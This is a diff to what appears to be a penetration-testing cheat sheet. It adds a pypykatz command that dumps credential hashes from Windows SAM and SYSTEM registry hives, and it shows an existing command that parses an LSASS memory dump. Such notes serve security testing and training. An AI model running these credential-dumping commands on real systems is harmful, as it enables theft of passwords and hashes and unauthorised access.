@@ -78,6 +78,9 @@ zip domainbh.zip *.json
 ```
 # Exploitation
 ```bash
+# Pypykatz to dump registry sam system
+pypykatz registry --sam sam system
+
 # Pypkayz to dump lsass
 pypykatz lsa minidump lsass.DMP
 ```
